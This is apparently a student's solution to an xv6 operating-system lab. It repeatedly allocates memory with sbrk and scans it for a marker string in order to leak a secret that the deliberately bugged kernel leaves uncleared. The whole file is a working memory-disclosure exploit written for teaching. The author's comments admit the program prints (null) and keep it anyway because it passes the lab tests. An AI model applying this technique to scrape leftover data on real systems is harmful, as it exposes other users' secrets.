#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

// memset() is omitted in kernel/vm.c and kernel/kalloc.c, this creates a bug
// that can be exploited to leak data from kernel memory.
// a function that uses sbrk() to allocate memory may receive the leaked data

// if you are reading this, sniffer returns (null) which is wrong?
// however, if you comment out the while(1) loop, it works as intended
// i have no idea why this happens
// the while version still passes the lab tests, so i will leave it as is as it is technically more efficient

int main(int argc, char *argv[])
{
  int size = 8 * 4096;
  char *helper = "This may help.";

  while (1)
  {
    char *memory = sbrk(size);
    if (memory == (char *)-1) // if sbrk fails, it will allocate (char *)-1
    {
      exit(1);
    }
    for (int i = 0; i < size - 16; i++)
    {
      int found = 1;
      for (int j = 0; j < strlen(helper); j++)
      {
        if (memory[i + j] != helper[j]) // if first byte mismatches, break
        {
          found = 0;
          break;
        }
      }

      if (found) // if inner loop didnt set found to 0, we found it
      {
        printf("%s\n", &memory[i + 16]);
        exit(0);
      }
    }
  }
}